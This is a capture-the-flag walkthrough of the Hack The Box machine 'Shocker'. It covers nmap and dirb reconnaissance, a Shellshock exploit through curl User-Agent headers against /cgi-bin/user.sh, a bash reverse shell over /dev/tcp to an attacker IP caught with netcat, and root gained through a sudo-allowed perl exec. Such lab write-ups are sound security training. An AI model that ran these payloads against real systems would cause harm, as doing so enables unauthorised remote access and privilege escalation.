# HTB - Shocker
## OS - Linux

As usual, I started with an nmap scan of Shocker (IP address 10.10.10.56).

```
$nmap -sC -sV -oN Shocker.nmap 10.10.10.56
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 18:05 PST
Nmap scan report for 10.10.10.56
Host is up (0.092s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```
Ports 80 and 2222 (SSH) are open. 

The index page on port 80 shows an image that says "Don't bug me". Not a lot of info to go on. So I ran nmap with safe scripts option and dirb tool.



dirb output:
```
$dirb http://10.10.10.56

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jan  1 18:08:21 2021
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                              
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)                            
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)       
```


nmap NSE output:
```
$nmap --script=safe 10.10.10.56
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 18:07 PST
Pre-scan script results:
|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.net/wpad.dat) from server
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for 10.10.10.56
Host is up (0.095s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|_http-comments-displayer: Couldn't find any comments.
|_http-date: Sat, 02 Jan 2021 02:12:29 GMT; +3m47s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Date: Sat, 02 Jan 2021 02:12:29 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
|   ETag: "89-559ccac257884"
|   Accept-Ranges: bytes
|   Content-Length: 137
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-title: Site doesn't have a title (text/html).
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
2222/tcp open  EtherNetIP-1
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2

Host script results:
|_clock-skew: 3m46s
|_fcrdns: FAIL (No PTR record)
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)

Post-scan script results:
| reverse-index: 
|   80/tcp: 10.10.10.56
|_  2222/tcp: 10.10.10.56
Nmap done: 1 IP address (1 host up) scanned in 356.53 seconds
```

dirb did not find anything interesting, so I ran dirbuster looking for .php, .sh, .pl. files and found this result:
```
Dir found: /cgi-bin/ - 403
File found: /cgi-bin/user.sh - 200
```

The user.sh was a small shell script that had the following contents:

```
$cat user.sh
Content-Type: text/plain

Just an uptime test script

 22:10:31 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00

```
This also gives me nothing. Searching online, esp. (https://pentesterlab.com/exercises/cve-2014-6271/course), and the fact that the box was named Shocker, makes me think Shellshock. 

So I tried the curl exploit from https://www.sevenlayers.com/index.php/125-exploiting-shellshock
```
$curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
And it worked. We see that the box is vulnerable to Shellshock and gives us the id of the running process - shelly.

Now we try for a reverse shell. 

Running nc listener on port 4444 on the attacker box, I typed the following to get a reverse shell:

```
$curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh\
```

On the nc listener, I see:

```
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.56] 46850
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ ls  
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
cd /home/shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
```

Now I got the user flag. To get root, I ran sudo -l.

I see

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

I see shelly can run perl commands as root. I remember it is possible to get bash shell through exec or system commands in perl. Took a few tries but finally this worked:

```
sudo perl -e 'exec "/bin/bash"'
```

There is no shell prompt to show that it worked, but when I typed id, I see I was root.

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash"'
sudo perl -e 'exec "/bin/bash"'

id
uid=0(root) gid=0(root) groups=0(root)
ls
user.txt
cd /root
ls
root.txt
cat root.txt

```

